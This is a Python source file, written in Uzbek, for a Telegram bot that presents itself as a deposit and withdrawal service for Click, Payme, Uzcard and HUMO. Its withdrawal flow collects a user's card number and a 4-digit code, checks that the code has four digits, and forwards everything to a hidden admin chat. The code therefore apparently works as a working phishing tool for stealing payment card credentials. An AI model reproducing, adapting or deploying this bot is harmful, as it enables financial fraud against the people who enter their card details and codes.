import os
import asyncio

from fastapi import FastAPI, Request
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# =========================
# SOZLAMALAR
# =========================

TOKEN = os.environ.get("TOKEN")
ADMIN_ID = os.environ.get("ADMIN_ID")
PORT = int(os.environ.get("PORT", "10000"))
RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL")

if not TOKEN:
    raise RuntimeError("TOKEN topilmadi!")

if not ADMIN_ID:
    raise RuntimeError("ADMIN_ID topilmadi!")

ADMIN_ID = int(ADMIN_ID)

# =========================
# MENU
# =========================

main_menu = ReplyKeyboardMarkup(
    [
        ["💰 Pul solish", "💸 Pul yechish"],
        ["📱 Ilova haqida"],
    ],
    resize_keyboard=True
)

payment_menu = ReplyKeyboardMarkup(
    [
        ["Click", "Payme"],
        ["Uzcard", "HUMO"],
        ["⬅️ Orqaga"],
    ],
    resize_keyboard=True
)

# Withdrawal bosqichlari
AMOUNT, CARD, CODE = range(3)

# =========================
# BOT
# =========================

telegram_app = (
    Application.builder()
    .token(TOKEN)
    .updater(None)
    .build()
)


# =========================
# START
# =========================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Assalomu alaykum! 👋\n\n"
        "Xush kelibsiz!\n"
        "Kerakli bo‘limni tanlang:",
        reply_markup=main_menu
    )


# =========================
# PUL SOLISH
# =========================

async def deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "💰 Pul solish uchun to‘lov usulini tanlang:",
        reply_markup=payment_menu
    )


async def payment_method(update: Update, context: ContextTypes.DEFAULT_TYPE):
    method = update.message.text

    if method == "⬅️ Orqaga":
        await update.message.reply_text(
            "Asosiy menyu:",
            reply_markup=main_menu
        )
        return

    if method in ["Click", "Payme", "Uzcard", "HUMO"]:
        user = update.effective_user

        await update.message.reply_text(
            f"✅ Siz {method} usulini tanladingiz.\n\n"
            "To‘lov ma’lumotlari tez orada beriladi.",
            reply_markup=main_menu
        )

        await telegram_app.bot.send_message(
            chat_id=ADMIN_ID,
            text=(
                "💰 YANGI PUL SOLISH SO‘ROVI\n\n"
                f"👤 Ism: {user.full_name}\n"
                f"🆔 ID: {user.id}\n"
                f"💳 Usul: {method}\n"
                f"🔗 Username: @{user.username if user.username else 'yo‘q'}"
            )
        )


# =========================
# PUL YECHISH — 1-QADAM
# =========================

async def withdrawal_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "💸 Pul yechish\n\n"
        "Iltimos, yechmoqchi bo‘lgan summani yozing.\n\n"
        "Masalan: 500000"
    )

    return AMOUNT


# =========================
# PUL YECHISH — 2-QADAM
# =========================

async def withdrawal_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    amount = update.message.text.strip()

    context.user_data["amount"] = amount

    await update.message.reply_text(
        "💳 Endi karta yoki to‘lov ma’lumotlaringizni yozing.\n\n"
        "Masalan:\n"
        "8600********1234"
    )

    return CARD


# =========================
# PUL YECHISH — 3-QADAM
# =========================

async def withdrawal_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    card = update.message.text.strip()

    context.user_data["card"] = card

    await update.message.reply_text(
        "🔐 Endi 4 xonali kodingizni kiriting.\n\n"
        "Masalan: 1234"
    )

    return CODE


# =========================
# PUL YECHISH — YAKUN
# =========================

async def withdrawal_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code = update.message.text.strip()

    if not code.isdigit() or len(code) != 4:
        await update.message.reply_text(
            "❌ Kod 4 xonali raqam bo‘lishi kerak.\n"
            "Masalan: 1234"
        )
        return CODE

    user = update.effective_user

    amount = context.user_data.get("amount", "")
    card = context.user_data.get("card", "")

    await telegram_app.bot.send_message(
        chat_id=ADMIN_ID,
        text=(
            "💸 YANGI PUL YECHISH SO‘ROVI\n\n"
            f"👤 Ism: {user.full_name}\n"
            f"🆔 ID: {user.id}\n"
            f"🔗 Username: @{user.username if user.username else 'yo‘q'}\n\n"
            f"💰 Summa: {amount}\n"
            f"💳 Karta/to‘lov: {card}\n"
            f"🔐 4 xonali kod: {code}"
        )
    )

    await update.message.reply_text(
        "✅ So‘rovingiz qabul qilindi!\n\n"
        "Operator tekshiradi va siz bilan bog‘lanadi.",
        reply_markup=main_menu
    )

    context.user_data.clear()

    return ConversationHandler.END


# =========================
# ORQAGA / BEKOR QILISH
# =========================

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()

    await update.message.reply_text(
        "Bekor qilindi.",
        reply_markup=main_menu
    )

    return ConversationHandler.END


# =========================
# ILOVA HAQIDA
# =========================

async def app_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📱 Ilova haqida\n\n"
        "Ilova haqida ma’lumot olish uchun operator bilan bog‘laning.",
        reply_markup=main_menu
    )


# =========================
# RASM QABUL QILISH
# =========================

async def photo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    await telegram_app.bot.send_message(
        chat_id=ADMIN_ID,
        text=(
            "📷 Foydalanuvchi rasm yubordi.\n\n"
            f"👤 Ism: {user.full_name}\n"
            f"🆔 ID: {user.id}\n"
            f"🔗 Username: @{user.username if user.username else 'yo‘q'}"
        )
    )

    await update.message.photo[-1].forward(chat_id=ADMIN_ID)

    await update.message.reply_text(
        "✅ Rasm qabul qilindi.",
        reply_markup=main_menu
    )


# =========================
# ODDIY XABARLAR
# =========================

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user = update.effective_user

    if text == "💰 Pul solish":
        await deposit(update, context)
        return

    if text in ["Click", "Payme", "Uzcard", "HUMO", "⬅️ Orqaga"]:
        await payment_method(update, context)
        return

    if text == "💸 Pul yechish":
        await withdrawal_start(update, context)
        return

    if text == "📱 Ilova haqida":
        await app_info(update, context)
        return

    await telegram_app.bot.send_message(
        chat_id=ADMIN_ID,
        text=(
            "📩 YANGI XABAR\n\n"
            f"👤 Ism: {user.full_name}\n"
            f"🆔 ID: {user.id}\n"
            f"🔗 Username: @{user.username if user.username else 'yo‘q'}\n\n"
            f"💬 Xabar:\n{text}"
        )
    )

    await update.message.reply_text(
        "✅ Xabaringiz qabul qilindi.",
        reply_markup=main_menu
    )


# =========================
# HANDLERLAR
# =========================

withdrawal_handler = ConversationHandler(
    entry_points=[
        MessageHandler(
            filters.Regex("^💸 Pul yechish$"),
            withdrawal_start
        )
    ],
    states={
        AMOUNT: [
            MessageHandler(filters.TEXT & ~filters.COMMAND, withdrawal_amount)
        ],
        CARD: [
            MessageHandler(filters.TEXT & ~filters.COMMAND, withdrawal_card)
        ],
        CODE: [
            MessageHandler(filters.TEXT & ~filters.COMMAND, withdrawal_code)
        ],
    },
    fallbacks=[
        CommandHandler("cancel", cancel)
    ],
)

telegram_app.add_handler(CommandHandler("start", start))

telegram_app.add_handler(withdrawal_handler)

telegram_app.add_handler(
    MessageHandler(
        filters.PHOTO,
        photo_handler
    )
)

telegram_app.add_handler(
    MessageHandler(
        filters.TEXT & ~filters.COMMAND,
        text_handler
    )
)


# =========================
# FASTAPI / WEBHOOK
# =========================

app = FastAPI()


@app.on_event("startup")
async def startup():
    await telegram_app.initialize()
    await telegram_app.start()

    webhook_url = f"{RENDER_EXTERNAL_URL}/telegram"

    await telegram_app.bot.set_webhook(
        url=webhook_url,
        drop_pending_updates=True
    )

    print("Telegram webhook o‘rnatildi:")
    print(webhook_url)


@app.on_event("shutdown")
async def shutdown():
    await telegram_app.stop()
    await telegram_app.shutdown()


@app.get("/")
async def home():
    return {
        "status": "Bot ishlayapti"
    }


@app.post("/telegram")
async def telegram_webhook(request: Request):
    data = await request.json()

    update = Update.de_json(
        data,
        telegram_app.bot
    )

    await telegram_app.update_queue.put(update)

    return {"ok": True}


# =========================
# SERVER
# =========================

if __name__ == "__main__":
    import uvicorn

    uvicorn.run(
        app,
        host="0.0.0.0",
        port=PORT
    )
